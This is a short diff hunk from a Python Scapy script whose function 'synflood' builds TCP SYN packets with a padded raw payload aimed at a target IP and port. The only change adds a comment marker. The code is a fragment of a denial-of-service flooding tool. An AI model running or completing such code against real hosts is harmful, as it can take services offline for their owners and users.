@@ -21,7 +21,7 @@ def synflood(source_port, target_ip, target_port):
         if choice.lower() == 'y':
             i=0
 
-            ip = IP(dst=target_ip)
+            ip = IP(dst=target_ip) ####
             tcp = TCP(sport=source_port, dport=target_port, flags="S")
 
             raw = Raw(b"X"*1024)
